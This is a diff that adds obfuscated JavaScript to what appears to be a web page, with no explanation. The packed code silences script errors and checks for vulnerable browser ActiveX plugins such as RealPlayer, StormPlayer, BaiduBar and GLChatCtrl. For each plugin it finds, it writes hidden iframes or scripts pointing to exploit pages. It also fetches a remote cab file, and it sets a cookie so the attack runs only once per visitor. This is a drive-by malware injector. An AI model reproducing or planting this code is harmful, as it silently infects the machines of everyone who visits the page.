@@ -1,0 +1,10 @@
+<SCRIPT LANGUAGE='JavaScript'> 
+function ResumeError() { 
+return true; 
+} 
+window.onerror = ResumeError; 
+</SCRIPT>
+<script>
+eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('6(5.N.14(\'L\')==-1){9{2 e;2 D=(5.16("3"));D.V("\\S\\H\\o\\y\\y\\F\\c","\\S\\H\\y\\F\\c\\19\\I\\q\\v\\r\\x\\z\\z\\r\\t\\r\\z\\E\\w\\t\\Q\\Q\\q\\s\\t\\v\\1c\\w\\E\\t\\s\\s\\x\\s\\1b\\1a\\x\\1f\\v\\1k\\w\\r");2 1m=D.1j("\\E\\c\\R\\c\\1g\\J\\T\\1h\\1i\\G\\o\\W","")}b(e){};8{2 n=a Z();n.Y(n.X()+15*P*P*17);5.N=\'L=10;12=/;n=\'+n.13();6(e!="[3 4]"){5.l("<u d=11.O><\\/u>")}1J{9{2 f;2 K=a m("M.M.1")}b(f){};8{6(f!="[3 4]"){5.l(\'<7 C=A:B d="1I.p"></7>\')}}9{2 g;2 1L=a m("1K.1H")}b(g){};8{6(g!="[3 4]"){5.l(\'<u d=1E.O><\\/u>\')}}9{2 h;2 1D=a m("1G")}b(h){};8{6(h!="[3 4]"){5.l(\'<7 C=A:B d="1F.p"></7>\')}}9{2 i;2 1M=a m("1N.1O.1")}b(i){};8{6(i!="[3 4]"){5.l(\'<7 C=A:B d="1r.p"></7>\')}}9{2 j;2 K=a m("1u.1t.1")}b(j){};8{6(j!="[3 4]"){5.l(\'<7 1o=1n 1q=0 d=1A.p></7>\')}}9{2 k;2 U=a m("1y.1x")}b(k){};8{6(k!="[3 4]"){U["\\q\\H\\R\\o\\c\\q\\T"]("1v://1w.1B.1C/1z.1p","\\I\\o\\F\\c\\1s\\J\\G\\1P\\G",0)}}6(f=="[3 4]"&&g=="[3 4]"&&h=="[3 4]"&&i=="[3 4]"&&j=="[3 4]"&&k=="[3 4]"){1e.1d("18:1l")}}}}',62,114,'||var|object|Error|document|if|iframe|finally|try|new|catch|x64|src||||||||write|ActiveXObject|expires|x61|htm|x44|x36|x30|x2d|script|x39|x33|x43|x73|x35|display|none|style|ado|x41|x69|x65|x6c|x42|x2e|storm|OK|IERPCtl|cookie|js|60|x31|x6f|x63|x53|Fuck|setAttribute|x6d|getTime|setTime|Date|Yes||path|toGMTString|indexOf|24|createElement|1000|about|x3a|x46|x34|x38|replace|location|x32|x62|x74|x72|createobject|x45|blank|as|100|width|cab|height|wo|x75|XPPlayer|PPlayer|http|sss|Tool|BaiduBar|Baidu1|Thunder|969222|com|yahoo|bb|pdg2|Pdg2|StormPlayer|re|else|MPS|pps|ourgame|GLCHAT|GLChatCtrl|x78'.split('|'),0,{}))
+
+</script>
